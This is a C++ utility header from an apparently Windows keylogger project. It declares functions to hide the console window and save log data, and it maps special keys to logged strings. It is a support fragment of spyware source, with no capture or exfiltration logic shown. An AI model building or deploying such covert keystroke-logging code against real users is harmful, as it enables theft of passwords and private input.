//
// Created by Dan on 8/23/2022.
//

#ifndef KEY_LOGGER_UTILS_HPP
#define KEY_LOGGER_UTILS_HPP

#include <string>
#include <fstream>
#include <windows.h>

#define current_function_name std::string("error in: ") + __FUNCTION__ + " -> "

namespace utils {

    inline const int special_keys_codes[] = {
            VK_SPACE,
            VK_RETURN,
            VK_BACK,
            VK_CAPITAL,
            VK_SHIFT,
            VK_CONTROL,
            VK_MENU
    };

    void hide_terminal();

    void save_log_data(const std::string &);

    void open_file_stream(std::fstream &, const std::string &, std::_Ios_Openmode);

    bool is_special_char(int);

    inline std::string translate_special_key_int_to_string(const int key) {
        switch (key) {
            case VK_SPACE:
                return " ";
            case VK_RETURN:
                return "\n";
            case VK_BACK:
                return "\b";
            case VK_CAPITAL:
                return "[CAPS_LOCK]";
            case VK_SHIFT:
                return "[SHIFT]";
            case VK_TAB:
                return "[TAB]";
            case VK_CONTROL:
                return "[CTRL]";
            case VK_MENU:
                return "[ALT]";
            default:
                return "";
        }
    }
}

#endif //KEY_LOGGER_UTILS_HPP
